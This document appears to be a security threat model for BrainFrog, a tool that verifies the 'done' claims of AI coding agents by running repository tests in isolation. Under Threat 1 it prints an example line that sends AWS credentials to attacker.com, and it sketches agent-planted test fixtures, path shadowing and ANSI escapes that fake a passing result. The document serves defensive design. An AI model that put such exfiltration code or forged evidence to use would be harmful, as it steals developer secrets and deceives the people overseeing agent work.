# BrainFrog Phase 1B: Verification Threat Model

**Document ID:** `BF-THREAT-1B-001`\
**Date:** October 19, 2026\
**Auditor:** Antigravity Agentic Pair Programmer\
**Product Positioning:** "Agent says done. BrainFrog proves it."

---

## 1. Context & Objective

BrainFrog acts as an independent verification authority for code generated by external coding agents (Claude Code, OpenCode, Codex, Devin, etc.).

When an agent claims:
> "Task complete. All tests pass."

The user runs:
```bash
bf verify --spec spec.md
```

To deliver on this value proposition, BrainFrog must evaluate code and specifications that are **untrusted by definition**. If evaluating an untrusted repository could execute hostile code that compromises the developer's workstation or forges proof artifacts, BrainFrog itself becomes an attack vector.

This threat model identifies trusted vs. untrusted components, concrete attack vectors, and what security controls are actually enforceable in the host runtime.

---

## 2. Component Trust Boundaries

```
+-----------------------------------------------------------------------------------+
|                              TRUSTED DOMAIN                                        |
|  - BrainFrog Engine & CLI (core/verifier.py)                                       |
|  - Hardened Policies (core/runtime/command_policy.py, process.py)                  |
|  - Local Operator Explicit Choices (CLI flags: --trust-local-code)                 |
+-----------------------------------------------------------------------------------+
                                         |
                       [Trust Boundary / Gatekeeper]
                                         v
+-----------------------------------------------------------------------------------+
|                             UNTRUSTED DOMAIN                                      |
|  - spec.md (Authored by agent or third party)                                     |
|  - Repository Source Code (Target repo generated by agent)                        |
|  - Test Files & Fixtures (tests/test_*.py, conftest.py, package.json)            |
|  - Build Recipes (Makefile, setup.py, pyproject.toml, CMakeLists)                 |
|  - Environment Artifacts (.env, repo-local virtualenvs, git hooks)                |
|  - Toolchain Plugins (pytest plugins, npm lifecycle scripts)                      |
|  - Execution Output (stdout, stderr, terminal escape sequences)                   |
|  - Pre-existing Reports (.brainfrog/reports/ supplied externally)                 |
+-----------------------------------------------------------------------------------+
```

### 2.1 Trusted Components
- **BrainFrog Core Engine:** Reviewed Python implementation (`core/verifier.py`, `core/runtime/*`).
- **Policy Engine:** Token-level command validation, strict binary allowlists, and drift detectors.
- **Human Operator:** Explicit configuration and runtime decisions passed via command-line flags.

### 2.2 Untrusted Components
- **Specification Document (`spec.md`):** Contains criterion titles, verification types, and command strings.
- **Repository Codebase:** All files in the verified repository. External agents could insert backdoors, obfuscated payloads, or malicious test fixtures.
- **Test Modules & Fixtures:** `conftest.py`, `test_*.py`, `package.json` scripts (`"test": "node evil.js"`).
- **Toolchain Plugins:** `pytest` automatically loads installed or local plugins; `npm` executes lifecycle hooks (`pretest`, `posttest`).
- **Standard Streams:** Unsanitized stdout/stderr streams that may contain terminal ANSI escape code injections (e.g. carriage return overwrite attacks).

## 3. Threat Catalog & Attack Scenarios

### Threat 1: Arbitrary Code Execution via Allowlisted Executables (Indirect Execution)
- **Vulnerability:** `core/runtime/command_policy.py` allowlists `python`, `pytest`, `unittest`, `npm`.
- **Attack Vector:** An untrusted spec specifies `python -m unittest tests.test_security`. The agent writes `tests/test_security.py` containing:
  ```python
  import os, urllib.request
  urllib.request.urlopen("https://attacker.com/steal?data=" + os.environ.get("AWS_SECRET_ACCESS_KEY", ""))
  ```
- **Consequence:** `shell=False` prevents shell injection, but the allowlisted Python interpreter executes arbitrary code with host user privileges.

### Threat 2: Host Credential Exfiltration
- **Vulnerability:** Child processes inherit parent environment variables by default.
- **Attack Vector:** Running a test or build command exposes developer environment variables (`OPENAI_API_KEY`, `TYPESAFE_API_KEY`, `GITHUB_TOKEN`, `AWS_*`).
- **Consequence:** A test fixture reads `os.environ` and exfiltrates keys.

### Threat 3: Executable & Path Shadowing
- **Vulnerability:** If the target repository contains a directory or script named `pytest`, `npm`, or `python`, a naive `shlex.split` execution might invoke the repository-controlled script instead of the system binary.
- **Consequence:** Hijacked execution flow prior to toolchain entry.

### Threat 4: Workspace Drift & Temporal Forgery
- **Vulnerability:** An agent tests code at revision A, but during test execution, files are altered (either by a self-modifying test or external process) so that the evidence does not reflect the claimed commit.
- **Consequence:** Verified report is bound to Git HEAD, but tested code contained uncommitted modifications.

### Threat 5: Report Overwrite & Deletion
- **Vulnerability:** A malicious or buggy script overwrites prior reports in `.brainfrog/reports/<run-id>/` or runs broad directory cleanup.
- **Consequence:** Destruction of audit trail and historical proof evidence.

### Threat 6: Terminal Escape Sequence Injection
- **Vulnerability:** Stderr/stdout containing ANSI terminal codes (e.g. `\x1b[2K\rAC-01 PASS`) alters console displays to trick operators into believing a failed check passed.
- **Consequence:** Visual misrepresentation of verification status.

## 4. What Is Actually Enforceable in Current Runtime

| Security Mechanism | What It ACTUALLY Enforces | What It DOES NOT Enforce |
|---|---|---|
| **`subprocess(..., shell=False)`** | Prevents shell metacharacter chaining (`&&`, `\|`, `;`, `$()`). | Does NOT stop allowlisted executables from running arbitrary repo scripts. |
| **Command Allowlist (`pytest`, `npm`)** | Restricts which binary is launched. | Does NOT isolate or sandbox the code executed by that binary. |
| **Environment Variable Stripping** | Removes host API keys and tokens from child process environment. | Does NOT stop malicious code from reading files on the host disk. |
| **Execution Timeout (Job/Subprocess)** | Terminates stalled processes after specified duration. | Does NOT prevent fast malicious actions before timeout expires. |
| **Source Snapshot Digest (SHA-256)** | Detects post-facto workspace drift and binds exact tested files. | Does NOT prevent execution side-effects during the run. |
| **OS Container / Disposable Sandbox** | Full filesystem, network, process, and memory isolation. | Only available when container backend (Docker/Podman) is configured. |

---

## 5. Security Strategy & Trust Boundaries for Phase 1B

1. **Fail-Closed by Default for Untrusted Execution:**
   - In environments without an active container/sandbox runtime, BrainFrog refuses to execute arbitrary repository code silently.
   - Any executable check (`build`, `test`) on untrusted specifications defaults to:
     ```text
     Criterion: BLOCKED
     Reason: Secure execution backend unavailable for untrusted repository code.
     ```
2. **Explicit Operator Authorization (`--trust-local-code`):**
   - The human operator can explicitly authorize local unconfined execution via `--trust-local-code`.
   - When enabled, the CLI and report explicitly display a high-visibility security warning:
     `WARNING: Verification running in TRUSTED_OPERATOR mode. Repository scripts execute with local user privileges.`
3. **Environment Scrubbing:**
   - Child processes in all modes run with scrubbed environments (`PATH`, `SYSTEMROOT`, `TEMP`, target repo `PYTHONPATH`), stripping all known cloud credentials and API keys.
4. **Binary Resolution Pinning:**
   - Command validation resolves binaries against system paths (`sys.executable` or validated system PATH), never relative unpinned repository paths.
5. **Pre- and Post-Drift Detection:**
   - The verifier records workspace state before execution and inspects it afterward. Any source drift invalidates an overall PASS verdict.
